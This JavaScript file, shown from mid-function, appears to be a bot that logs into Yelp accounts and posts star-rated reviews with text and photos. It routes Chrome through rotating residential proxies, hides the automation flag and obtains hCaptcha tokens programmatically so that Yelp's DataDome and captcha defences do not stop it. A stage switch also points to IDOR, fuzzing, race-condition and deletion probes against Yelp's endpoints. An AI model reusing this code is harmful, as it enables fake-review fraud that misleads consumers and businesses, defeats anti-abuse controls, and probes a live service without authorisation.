    const links=await ev(`(function(){var s=[];var a=document.querySelectorAll('a[href*="/biz/"]');
      for(var i=0;i<a.length;i++){var h=a[i].getAttribute('href')||'';var m=h.indexOf('/biz/');
        if(m>=0){h=h.slice(m).split('?')[0];if(s.indexOf(h)<0)s.push(h);}}
      return JSON.stringify(s.slice(0,15));})()`);
    rec({e:'search_links',links});
    let arr=[];try{arr=JSON.parse(links);}catch(e){}
    if(!arr.length){rec({e:'abort',why:'no_search_results'});return;}
    const pick=arr.find(x=>{const p=x.split('/');return p[2]&&p[2].length>=20;})||arr[0];
    bizUrl='https://www.yelp.com'+pick;
  }
  rec({e:'bizUrl',bizUrl});
  let bp=null;
  for(let a=0;a<2&&!bp;a++){
    await sendS('Page.navigate',{url:bizUrl});
    bp=await wait(o=>o.l>100000,22,'biz'+a);
    if(!bp){const fs2=await st();rec({e:'biz_fail',a,page:fs2});await sleep(1500);}
  }
  rec({e:'biz_page',u:bp&&bp.u,l:bp&&bp.l,t:bp&&bp.t,txt:bp&&bp.txt});
  if(!bp){rec({e:'abort',why:'biz_load'});return;}
  const bi=await ev(`(function(){var h=document.documentElement.innerHTML;
    var i=h.indexOf('writeareview/biz/'),war='';if(i>=0)war=h.slice(i+17).split(/[^A-Za-z0-9_-]/)[0];
    var j=h.indexOf('"encid":"'),enc='';if(j>=0)enc=h.slice(j+9).split('"')[0];
    var links=[];var as=document.querySelectorAll('a[href*="writeareview"]');for(var k=0;k<as.length&&k<4;k++)links.push(as[k].href);
    return JSON.stringify({war:war,enc:enc,links:links,cnt:(document.body.innerText.match(/[\\d,]+ reviews?/i)||[''])[0],
      cap:!!window.hcaptcha,txt:(document.body.innerText||'').replace(/\\s+/g,' ').slice(0,180)});})()`);
  rec({e:'biz_info',bi});
  let bj={};try{bj=JSON.parse(bi);}catch(e){}
  let wr=/writeareview/.test(bizUrl)?bizUrl:((bj.links&&bj.links[0])||'');
  if(!wr&&(bj.enc||bj.war)){const id=bj.enc||bj.war;
    wr='https://www.yelp.com/writeareview/biz/'+id+'?return_url=%2Fbiz%2F'+id+'&review_origin=biz-details-war-button&rating='+RATING;}
  if(!wr){rec({e:'abort',why:'nowrite'});return;}
  rec({e:'wr',url:wr});
  await sendS('Page.navigate',{url:wr});
  let wp=await wait(o=>o.l>60000,25,'write');
  if(!wp){const fs3=await st();rec({e:'write_fail',page:fs3});await sendS('Page.navigate',{url:wr});wp=await wait(o=>o.l>60000,15,'write2');}
  rec({e:'write_page',u:wp&&wp.u,l:wp&&wp.l,t:wp&&wp.t,z:wp&&wp.z,txt:wp&&wp.txt});
  if(!wp){rec({e:'abort',why:'write_load'});return;}
  if(!/writeareview/.test(wp.u||'')){rec({e:'warn',why:'redirected',u:wp.u,txt:wp.txt});}
  const fd=await ev(`JSON.stringify({
    stars:(function(){var o=[];var els=document.querySelectorAll('[role=radio],button[aria-label*="star" i],[data-star]');for(var i=0;i<els.length&&i<10;i++)o.push({tag:els[i].tagName,al:(els[i].getAttribute('aria-label')||'').slice(0,24),ds:els[i].getAttribute('data-star'),t:(els[i].textContent||'').trim().slice(0,10)});return o;})(),
    ta:(function(){var o=[];var t=document.querySelectorAll('textarea');for(var i=0;i<t.length&&i<4;i++)o.push({n:t[i].name,p:(t[i].placeholder||'').slice(0,40)});return o;})(),
    file:(function(){var o=[];var f=document.querySelectorAll('input[type=file]');for(var i=0;i<f.length&&i<3;i++)o.push(f[i].name+'/'+(f[i].accept||'').slice(0,30));return o;})(),
    forms:(function(){var o=[];for(var i=0;i<document.forms.length&&i<4;i++){var f=document.forms[i];o.push({id:f.id,a:(f.getAttribute('action')||'').slice(0,60),ins:[].map.call(f.querySelectorAll('input,select,textarea'),function(x){return x.name+':'+x.type;}).slice(0,18)});}return o;})(),
    cap:!!window.hcaptcha,
    inputs:(function(){var o=[];var a=document.querySelectorAll('input');for(var i=0;i<a.length&&i<20;i++)o.push({n:a[i].name,t:a[i].type,v:a[i].value,id:a[i].id});return o;})(),
    ce:(function(){var o=[];var a=document.querySelectorAll('[contenteditable="true"],[contenteditable=""]');for(var i=0;i<a.length&&i<5;i++)o.push({tag:a[i].tagName,role:a[i].getAttribute('role'),ph:a[i].getAttribute('data-placeholder')||a[i].getAttribute('aria-placeholder')||'',len:(a[i].innerText||'').length});return o;})(),
    btn:(function(){var o=[];var b=document.querySelectorAll('button');for(var i=0;i<b.length&&o.length<12;i++){if(b[i].offsetParent&&b[i].textContent.trim())o.push(b[i].textContent.trim().slice(0,22));}return o;})(),
    btnOuter:(function(){var b=document.querySelectorAll('button');for(var i=0;i<b.length;i++){if(/post review/i.test(b[i].textContent||''))return b[i].outerHTML.slice(0,200);}return '';})(),
    txt:(document.body.innerText||'').replace(/\\s+/g,' ').slice(0,300)});`);
  rec({e:'form',fd});
  if(!SUBMIT){rec({e:'done',stage:'discover'});return;}

  // rating: React radios input[name^=rating-][value=N]
  await ev(`window.scrollTo(0,0)`);await sleep(400);
  const rr=await ev(`(function(){var r=document.querySelector('input[name^="rating-"][value="${RATING}"]');if(!r)return null;
    var l=r.closest('label')||r.parentElement;var b=l.getBoundingClientRect();
    return JSON.stringify({x:Math.round(b.x+b.width/2),y:Math.round(b.y+b.height/2),w:Math.round(b.width),h:Math.round(b.height),tag:l.tagName});})()`);
  let star='none';
  try{const o=JSON.parse(rr);if(o&&o.w>0){
    await sendS('Input.dispatchMouseEvent',{type:'mouseMoved',x:o.x,y:o.y});await sleep(100);
    await sendS('Input.dispatchMouseEvent',{type:'mousePressed',x:o.x,y:o.y,button:'left',clickCount:1});await sleep(60);
    await sendS('Input.dispatchMouseEvent',{type:'mouseReleased',x:o.x,y:o.y,button:'left',clickCount:1});
    star='mouse:'+o.x+','+o.y+':'+o.tag;}}catch(e){}
  await sleep(600);
  const star2=await ev(`(function(){var r=document.querySelector('input[name^="rating-"][value="${RATING}"]');
    var t=document.body.innerText;var ok=/Great|Good|OK|Could be better|Not good/.test(t)&&!/Select your rating/.test(t);
    if(!ok){var l=r.closest('label')||r.parentElement;l.click();}
    return 'checked:'+r.checked+':sel:'+ok;})()`);  rec({e:'star',star,star2,rlen:(TEXT||'').length});
  await sleep(700);
  // editor: div[role=textbox][contenteditable]
  const focus=await ev(`(function(){var ce=document.querySelector('div[role=textbox][contenteditable="true"],div[role=textbox][contenteditable=""]');
    if(!ce)return 'noce';ce.focus();var r=document.createRange();r.selectNodeContents(ce);r.collapse(false);
    var s=window.getSelection();s.removeAllRanges();s.addRange(r);return 'focused:'+ce.tagName;})()`);
  rec({e:'focus',focus});
  if(TEXT){
    await sendS('Input.insertText',{text:TEXT});
    await sleep(800);
    let v=await ev(`(function(){var ce=document.querySelector('div[role=textbox][contenteditable="true"],div[role=textbox][contenteditable=""]');return ce?ce.innerText.length:-1;})()`);
    if(!v||v<40){
      // fallback: execCommand in-page
      await ev(`(function(){var ce=document.querySelector('div[role=textbox][contenteditable="true"],div[role=textbox][contenteditable=""]');ce.focus();document.execCommand('insertText',false,${JSON.stringify(TEXT)});return 1;})()`);
      await sleep(600);
      v=await ev(`(function(){var ce=document.querySelector('div[role=textbox][contenteditable="true"],div[role=textbox][contenteditable=""]');return ce?ce.innerText.length:-1;})()`);
    }
    rec({e:'text_len',v});
  }
  await sleep(900);
  const state=await ev(`(function(){var b=document.querySelector('[data-testid=post-button]');var ce=document.querySelector('div[role=textbox][contenteditable]');
    return JSON.stringify({act:b?b.getAttribute('data-activated'):null,dis:b?b.disabled:null,cls:b?b.className:'',
      rads:[].map.call(document.querySelectorAll('input[name^=rating-]'),function(x){return x.value+':'+x.checked;}).join('|'),
      hid:[].map.call(document.querySelectorAll('input[type=hidden],textarea'),function(x){return x.name+'='+String(x.value).slice(0,24);}),
      ceLen:ce?ce.innerText.length:-1,ceHtml:ce?ce.innerHTML.slice(0,100):'',
      btnParent:b&&b.parentElement?b.parentElement.tagName:'',txt:(document.body.innerText||'').replace(/\\s+/g,' ').slice(-120)});})()`);
  rec({e:'pre_post_state',state});
  if(process.env.PHOTO&&fs.existsSync(process.env.PHOTO)){
    try{
      const doc=await sendS('DOM.getDocument',{depth:-1});
      const root=doc&&doc.result&&doc.result.root&&doc.result.root.nodeId;
      const q=await sendS('DOM.querySelector',{nodeId:root,selector:'input[type=file]'});
      const fid=q&&q.result&&q.result.nodeId;
      if(fid){await sendS('DOM.setFileInputFiles',{nodeId:fid,files:[path.resolve(process.env.PHOTO)]});rec({e:'photo',ok:true});}
      else rec({e:'photo',ok:false,why:'nofileinput'});
    }catch(e){rec({e:'photo',ok:false,why:String(e&&e.message||e)});}
    await sleep(3500);
  }
  await ev(`(function(){if(window.__gqlWrapped)return 1;window.__gqlWrapped=1;window.__gql=[];
    var of=window.fetch;window.fetch=async function(u,o){var r=await of.apply(this,arguments);
      try{if(String(u).indexOf('/gql/batch')>=0){var c=r.clone();c.text().then(function(t){window.__gql.push(t.slice(0,1500));});}}catch(e){}
      return r;};return 1;})()`);
  const post=await ev(`(function(){var b=document.querySelector('[data-testid=post-button]');
    if(!b)return 'nobtn';b.click();return 'clicked:'+b.getAttribute('data-activated');})()`);
  rec({e:'post_click',post});
  rec({e:'netlog',n:(nlog||[]).length,items:(nlog||[]).slice(-5)});
  const after=await wait(o=>/thanks|posted|remove review|recommended|problem|error|review/i.test(o.txt||''),15,'after');
  rec({e:'after_post',u:after&&after.u,t:after&&after.t,txt:after&&after.txt});
  rec({e:'netlog2',n:(nlog||[]).length,items:(nlog||[]).slice(-3)});
  rec({e:'cr_req',items:(nlog||[]).filter(function(x){return String(x.d).indexOf('CreateReview')>=0;}).slice(-1)});
  await sleep(3500);
  const g=await ev(`JSON.stringify({gql:(window.__gql||[]).slice(-4),body:(document.body.innerText||'').replace(/\\s+/g,' ').slice(0,500)})`);
  rec({e:'gql_resp',g:g});
  // verify on the user's own review list first (auth path, no DataDome), then biz page
  const snippet=(TEXT||'').slice(0,50);
  for(const vu of ['https://www.yelp.com/user_details_reviews_self','https://www.yelp.com/biz/'+(BIZ.match(/[A-Za-z0-9_-]{20,}/)||[''])[0]]){
    await sendS('Page.navigate',{url:vu});
    const vp=await wait(o=>o.l>80000,15,'verify');
    if(!vp){rec({e:'verify_fail',vu});continue;}
    const vis=await ev(`JSON.stringify({u:location.href,hit:(document.body.innerText||'').indexOf(${JSON.stringify(snippet)})>=0,
      nr:(document.body.innerText||'').toLowerCase().indexOf('not currently recommended')>=0,
      txt:(document.body.innerText||'').replace(/\\s+/g,' ').slice(0,220)})`);
    rec({e:'verify',vu,vis});
  }
  rec({e:'done',stage:'submit'});
}

async function attempt(n){
  const SESS=(process.env.SESSID||('fl'+Math.floor(Math.random()*1e6)));
  const city=process.env.CITY?('-cc-US-city-'+process.env.CITY):'-cc-US';
  const PU=PU_BASE+city+'-sessid-'+SESS+'-sesstime-1800';
  const AUTH='Basic '+Buffer.from(PU+':'+PW).toString('base64');
  let LP=21000+Math.floor(Math.random()*8000),CP=LP+1;
  const relay=http.createServer(()=>{});
  relay.on('connect',(req,cs)=>{const s=net.connect(7777,'pr.oxylabs.io',()=>s.write('CONNECT '+req.url+' HTTP/1.1\r\nHost: '+req.url+'\r\nProxy-Authorization: '+AUTH+'\r\n\r\n'));let b=Buffer.alloc(0);function d(x){b=Buffer.concat([b,x]);const i=b.indexOf('\r\n\r\n');if(i<0)return;s.removeListener('data',d);const rest=b.slice(i+4);const m=b.slice(0,i).toString().match(/^HTTP\/1\.[01]\s+(\d+)/);if(!m||+m[1]!==200){try{cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n');}catch(e){}s.destroy();return;}cs.write('HTTP/1.1 200 Connection Established\r\n\r\n');if(rest.length)cs.write(rest);s.pipe(cs);cs.pipe(s);s.on('error',()=>cs.destroy());cs.on('error',()=>s.destroy());}s.on('data',d);s.on('error',()=>{try{cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n');}catch(e){}});});
  const lerr=await new Promise((res)=>{const onErr=e=>{relay.removeListener('error',onErr);res(e);};relay.once('error',onErr);relay.listen(LP,'127.0.0.1',()=>{relay.removeListener('error',onErr);res(null);});});
  if(lerr){rec({a:n,e:'relay_err',err:String(lerr.message)});try{relay.close();}catch(e){}return {ok:false,why:'relay',udd:path.join(os.tmpdir(),'x')};}
  const udd=process.env.PROFILE||path.join(os.tmpdir(),'flow-'+Date.now());
  const chrome=spawn('C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',[
    '--no-first-run','--no-default-browser-check','--disable-blink-features=AutomationControlled',
    ...(process.env.HEADLESS==='1'?['--headless=new','--disable-gpu','--renderer-process-limit=1','--js-flags=--max-old-space-size=128','--disable-dev-shm-usage','--disable-extensions','--disable-sync','--disable-default-apps','--disable-component-update']:[]),
    '--window-size=1280,900','--window-position=0,0','--lang=en-US','--user-data-dir='+udd,
    '--disable-background-timer-throttling','--disable-backgrounding-occluded-windows','--disable-renderer-backgrounding',
    '--disable-features=CalculateNativeWinOcclusion,IntensiveWakeUpThrottling,Prerender2,SpeculationRulesPrefetch',
    '--force-webrtc-ip-handling-policy=disable_non_proxied_udp',
    '--proxy-server=http://127.0.0.1:'+LP,'--remote-debugging-port='+CP,'about:blank'
  ],{stdio:'ignore'});
  let ver=null;for(let k=0;k<80&&!ver;k++){await sleep(250);try{ver=await(await fetch('http://127.0.0.1:'+CP+'/json/version')).json();}catch(e){}}
  if(!ver){try{chrome.kill();}catch(e){}relay.close();return {ok:false,why:'cdp',udd};}
  const ws=new WebSocket(ver.webSocketDebuggerUrl);ws.addEventListener('error',()=>{});
  let id=0;const pend=new Map();const nlog=[];const gqlReq=new Map();
  ws.addEventListener('message',e=>{let m;try{m=JSON.parse(e.data);}catch(_){return;}
    if(m.method==='Network.requestWillBeSent'){const r=m.params.request;
      if(r.method==='POST'&&/writeareview|\/gql|\/ajax|\/review/i.test(r.url))var hh={};try{for(var k in r.headers){if(/^x-|^content-type|^accept/i.test(k))hh[k]=String(r.headers[k]).slice(0,80);}}catch(e){}
      nlog.push({u:r.url.slice(0,170),d:(r.postData||'').slice(0,12000),h:hh});}
    if(m.method==='Network.responseReceived'&&/gql\/batch/.test(m.params.response.url||''))gqlReq.set(m.params.requestId,m.params.response.url);
    if(m.method==='Network.loadingFinished'&&gqlReq.has(m.params.requestId)){
      const rid=m.params.requestId;gqlReq.delete(rid);
      const mid=++id;pend.set(mid,rm=>{try{rec({e:'gql_body',b:String((rm.result||{}).body||'').slice(0,6000)});}catch(e){}});
      try{ws.send(JSON.stringify({id:mid,method:'Network.getResponseBody',params:{requestId:rid},sessionId:sid}));}catch(e){}
    }
    if(m.id&&pend.has(m.id)){pend.get(m.id)(m);pend.delete(m.id);}});
  const wsOpen=await Promise.race([
    new Promise((r,j)=>{ws.addEventListener('open',()=>r('ok'));ws.addEventListener('error',()=>j(new Error('ws_error')));}).then(()=>'ok').catch(()=>'err'),
    sleep(15000).then(()=>'timeout')
  ]);
  if(wsOpen!=='ok'){rec({a:n,e:'ws_fail',why:wsOpen});try{chrome.kill();}catch(e){}relay.close();return {ok:false,why:'ws',udd};}
  const send=(m,p)=>new Promise(r=>{const i=++id;pend.set(i,r);ws.send(JSON.stringify({id:i,method:m,params:p||{}}));});
  let sid=null;for(let k=0;k<80&&!sid;k++){await sleep(250);const t=await send('Target.getTargets');const pg=t&&t.result&&t.result.targetInfos.find(x=>x.type==='page');
    if(pg){const a=await send('Target.attachToTarget',{targetId:pg.targetId,flatten:true});if(a&&a.result)sid=a.result.sessionId;}}
  if(!sid){try{chrome.kill();}catch(e){}relay.close();return {ok:false,why:'sid',udd};}
  const sendS=(m,p)=>new Promise(r=>{const i=++id;pend.set(i,r);ws.send(JSON.stringify({id:i,method:m,params:p||{},sessionId:sid}));});
  let freezes=0;
  const ev=e=>new Promise(res=>{
    const i=1e9+Math.floor(Math.random()*1e8);let done=false;
    const cleanup=()=>{try{ws.removeEventListener('message',h);}catch(_){}};
    const h=x=>{try{const m=JSON.parse(x.data);if(m.id===i){done=true;cleanup();
      if(m.result&&m.result.exceptionDetails)return res('EXC:'+JSON.stringify(m.result.exceptionDetails).slice(0,150));
      res(m.result&&m.result.result?m.result.result.value:'ERR:'+JSON.stringify(m.error||{}).slice(0,120));}}catch(_){}};
    ws.addEventListener('message',h);
    try{ws.send(JSON.stringify({id:i,method:'Runtime.evaluate',params:{expression:e,returnByValue:true,awaitPromise:true},sessionId:sid}));}catch(err){cleanup();return res('SENDERR');}
    setTimeout(()=>{if(!done){cleanup();freezes++;res('TIMEOUT');}},8000);
  });
  const cookies=async()=>{const c=await sendS('Network.getAllCookies');return ((c.result||{}).cookies)||[];};
  const st=()=>ev(`JSON.stringify({u:location.href,t:document.title,l:document.documentElement.outerHTML.length,
    f:!!document.getElementById('ajax-login'),h:!!window.hcaptcha,
    w:(document.querySelector('[data-hcaptcha-widget-id]')||{}).getAttribute?document.querySelector('[data-hcaptcha-widget-id]').getAttribute('data-hcaptcha-widget-id'):'',
    dd:(document.documentElement.innerHTML.match(/captcha-delivery/)||[''])[0],
    txt:(document.body.innerText||'').replace(/\\s+/g,' ').slice(0,140)})`);

  await sendS('Page.enable');await sendS('Network.enable');await sendS('Emulation.setFocusEmulationEnabled',{enabled:true});
  if(process.env.SKIP_LOGIN==='1'){
    const be=process.env.BIZ_ENCID||'';
    await Promise.race([sendS('Page.navigate',{url:'https://www.yelp.com/writeareview/biz/'+be+'?return_url=%2Fbiz%2F'+be+'&review_origin=biz-details-war-button'}),sleep(12000)]);
    await sleep(4000);
    return {ok:true,zss:0,udd,chrome,relay,cookies,sendS,ev,send,sid,nlog,noauth:true};
  }
  await sendS('Page.navigate',{url:'https://www.yelp.com/login/'});

  // ddok (docs: >200 kB + Log In title, 50 s budget, else IP burned)
  let ddok=false,last='';
  for(let k=0;k<34;k++){await sleep(1500);last=await st();
    if(last==='TIMEOUT'){if(freezes>=2)return {ok:false,why:'dd_freeze',udd};continue;}
    freezes=0;
    try{const o=JSON.parse(last);if(o.l>200000&&/log ?in/i.test(o.t)){ddok=true;break;}}catch(e){}}
  rec({a:n,e:'ddok',ddok,page:last});
  if(!ddok){
    // A kept profile can already be logged in: /login/ redirects away, so ddok never
    // matches, but the zss cookie is live. Reuse that session instead of re-logging.
    const z0=(await cookies()).filter(c=>c.name==='zss');
    if(z0.length){
      rec({a:n,e:'already_logged_in',zss:z0[0].value.length,page:last});
      return {ok:true,zss:z0[0].value.length,udd,chrome,relay,cookies,sendS,ev,send,sid,nlog,reused:true};
    }
    try{chrome.kill();}catch(e){}relay.close();return {ok:false,why:'dd',udd};
  }

  // hydrate (docs: #ajax-login + hcaptcha + >400000, up to 4 reloads)
  let ready=false;
  for(let a=0;a<4&&!ready;a++){
    if(a)await sendS('Page.navigate',{url:'https://www.yelp.com/login/'});
    for(let k=0;k<20;k++){
      await sleep(1000);
      const s=await st();
      if(s==='TIMEOUT'){if(freezes>=2)return {ok:false,why:'dd_freeze_hydrate',udd};continue;}
      freezes=0;
      try{const o=JSON.parse(s);if(o.f&&o.h&&o.l>400000){ready=true;last=s;break;}}catch(e){}
      last=s;
    }
    if(!ready)rec({a:n,e:'hydrate_round',round:a,page:last});
  }
  rec({a:n,e:'hydrated',ready,page:last});
  if(!ready){try{chrome.kill();}catch(e){}relay.close();return {ok:false,why:'hydrate',udd};}

  // arm the page's own widget (docs: prefer [data-hcaptcha-widget-id])
  const armed=await ev(`(function(){
    var c=document.querySelector('[data-hcaptcha-widget-id]');
    if(c&&c.getAttribute('data-hcaptcha-widget-id')){window.__wid=c.getAttribute('data-hcaptcha-widget-id');window.__own=false;return 'site:'+window.__wid;}
    if(!window.hcaptcha)return 'no-api';
    var d=document.createElement('div');d.id='__fcap';d.style.display='none';document.body.appendChild(d);
    try{window.__wid=window.hcaptcha.render(d,{sitekey:'${SITEKEY}',size:'invisible',callback:function(t){window.__fcTok=t;}});}catch(e){return 'err:'+e.message;}
    window.__own=true;return 'own:'+window.__wid;})()`);
  rec({a:n,e:'widget',armed});
  if(String(armed).startsWith('err')||armed==='no-api'){try{chrome.kill();}catch(e){}relay.close();return {ok:false,why:'widget',udd};}

  let tok='';
  for(let t=0;t<3&&!tok;t++){
    tok=await ev(`new Promise(function(res){var w=window.__wid;if(!w){res('');return;}var done=false;function fin(t){if(!done){done=true;res(t||'');}}window.__fcTok='';try{window.hcaptcha.execute(w);}catch(e){fin('');return;}var n=0;var iv=setInterval(function(){n++;var t=window.__fcTok||'';if(!t){try{t=window.hcaptcha.getResponse(w)||'';}catch(e){}}if(t){clearInterval(iv);fin(t);}else if(n>60){clearInterval(iv);fin('');}},200);})`);
    if(!tok){rec({a:n,e:'tokfail',try:t+1});await sleep(1200);
      await ev(`(function(){try{if(window.__wid&&window.hcaptcha)window.hcaptcha.reset(window.__wid);}catch(e){}window.__fcReady=false;return 1;})()`);}
  }
  if(tok==='TIMEOUT'||tok==='SENDERR'||String(tok).startsWith('ERR:'))tok='';
  rec({a:n,e:'token',len:String(tok||'').length});
  if(!tok){try{chrome.kill();}catch(e){}relay.close();return {ok:false,why:'captcha',udd};}

  const csrf=await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
  rec({a:n,e:'csrf',len:String(csrf||'').length});
  const raw=await ev(`(async function(){var b=new URLSearchParams();
    b.set('csrftok',${JSON.stringify(csrf)});b.set('email',${JSON.stringify(EMAIL)});b.set('password',${JSON.stringify(PASS)});b.set('hcaptcha_response',${JSON.stringify(tok)});
    try{var r=await fetch('/login/%6E%65%77%61%6A%61%78',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'},body:b.toString()});
      return JSON.stringify({s:r.status,b:(await r.text()).slice(0,300)});}catch(e){return JSON.stringify({s:-1,b:String(e.message)});}})()`);
  rec({a:n,e:'login',raw:String(raw).slice(0,340)});
  await sleep(2500);
  let z=(await cookies()).filter(c=>c.name==='zss');
  if(!z.length){
    // One retry with a fresh token, per docs (unable with a real token is retried once).
    let js={};try{js=JSON.parse(raw);}catch(e){}
    let body={};try{body=JSON.parse(js.b||'null');}catch(e){}
    if(/unable to log you in/i.test(js.b||'')){
      const t2=await ev(`new Promise(function(res){var w=window.__wid;if(!w){res('');return;}var done=false;function fin(t){if(!done){done=true;res(t||'');}}window.__fcTok='';try{window.hcaptcha.execute(w);}catch(e){fin('');return;}var n=0;var iv=setInterval(function(){var t=window.__fcTok||'';if(!t){try{t=window.hcaptcha.getResponse(w)||'';}catch(e){}}if(t){clearInterval(iv);fin(t);}else if(++n>60){clearInterval(iv);fin('');}},200);})`);
      if(t2&&t2!=='TIMEOUT'&&!String(t2).startsWith('ERR:')){
        const raw2=await ev(`(async function(){var b=new URLSearchParams();b.set('csrftok',${JSON.stringify(csrf)});b.set('email',${JSON.stringify(EMAIL)});b.set('password',${JSON.stringify(PASS)});b.set('hcaptcha_response',${JSON.stringify(t2)});
          try{var r=await fetch('/login/%6E%65%77%61%6A%61%78',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'},body:b.toString()});return JSON.stringify({s:r.status,b:(await r.text()).slice(0,300)});}catch(e){return JSON.stringify({s:-1,b:String(e.message)});}})()`);
        rec({a:n,e:'login_retry',raw:String(raw2).slice(0,340)});
        await sleep(2500);
        z=(await cookies()).filter(c=>c.name==='zss');
      }
    }
  }
  rec({a:n,e:'zss',n:z.length,len:z.map(c=>c.value.length)});
  if(z.length){
    try{await sendS('Page.navigate',{url:'https://www.yelp.com/profile'});}catch(e){}
    await sleep(3000);
    const pp=await st();rec({a:n,e:'profile_after',page:pp});
    return {ok:true,zss:z[0].value.length,udd,chrome,relay,cookies,sendS,ev,send,sid,nlog};
  }
  try{chrome.kill();}catch(e){}relay.close();
  return {ok:false,why:'verdict',udd};
}

(async()=>{
  rec({e:'start',email:EMAIL,city:process.env.CITY||''});
  for(let a=1;a<=ATTEMPTS;a++){
    const r=await attempt(a);
    rec({e:'attempt_done',a,ok:r.ok,why:r.why});
    if(r.ok){
      rec({e:'session_ready',zss:r.zss,profile:r.udd});
      if((process.env.STAGE||'login')==='resurrect'){
        try{await resurrect(r);}catch(e){rec({e:'rr_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='delprobe'){
        try{await delProbe(r);}catch(e){rec({e:'del_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='idor'){
        try{await idor(r);}catch(e){rec({e:'idor_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='counts'){
        try{await counts(r);}catch(e){rec({e:'counts_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='surfaces'){
        try{await surfaces(r);}catch(e){rec({e:'surfaces_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='fuzz3'){
        try{await fuzz3(r);}catch(e){rec({e:'fuzz3_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='formpost'){
        try{await formPost(r);}catch(e){rec({e:'fp_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='editprobe'){
        try{await editProbe(r);}catch(e){rec({e:'edit_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='race'){
        try{await raceTest(r);}catch(e){rec({e:'race_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='fuzz2'){
        try{await fuzz2(r);}catch(e){rec({e:'fuzz2_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='fuzz'){
        try{await fuzzFields(r);}catch(e){rec({e:'fuzz_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='probe2'){
        try{await probe2(r);}catch(e){rec({e:'probe2_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='api-batch'){
        try{await apiBatch(r);}catch(e){rec({e:'batch_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='api-post'){
        try{await apiPost(r);}catch(e){rec({e:'apipost_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='api'){
        try{await apiOnly(r);}catch(e){rec({e:'api_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')==='verify'){
        try{await verifyOnly(r);}catch(e){rec({e:'verify_err',err:String((e&&e.stack)||e).slice(0,300)});}
      } else if((process.env.STAGE||'login')!=='login'){
        try{await runReview(r);}catch(e){rec({e:'review_err',err:String((e&&e.stack)||e).slice(0,300)});}
      }
      try{r.chrome.kill();}catch(e){}
      try{r.relay.close();}catch(e){}
      if(process.env.KEEP_PROFILE==='1') rec({e:'profile_kept',dir:r.udd});
      else { try{fs.rmSync(r.udd,{recursive:true,force:true});}catch(e){} }
      return;
    }
    if(!process.env.PROFILE){try{fs.rmSync(r.udd,{recursive:true,force:true});}catch(e){}}
    await sleep(1200);
  }
  rec({e:'give_up'});
})();
